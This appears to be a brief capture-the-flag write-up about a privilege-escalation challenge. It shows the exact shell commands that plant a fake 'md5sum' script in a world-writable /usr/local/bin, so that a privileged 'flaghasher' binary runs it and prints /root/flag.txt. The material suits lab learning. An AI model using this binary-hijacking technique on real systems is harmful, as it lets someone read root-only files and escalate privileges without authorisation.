# This time we getting a bit fancier

For starters if you don't see the binary in the home directory do no panic. It is added in the ![$PATH] and is comfortably located in /usr/local/bin or other directory like that which you can find with ![which flaghasher]

You can't do the same since you have a lot less privileges. Instead you get globar read-write-execute on /usr/local/bin where we will create our fake md5sum bash script that only reads the flag using the following commands:

> echo '#!/bin/sh' | tee /usr/local/bin/md5sum
> echo 'cat /root/flag.txt' | tee -a /usr/local/bin/md5sum
> chmod +x /usr/local/bin/md5sum

and then run flaghasher
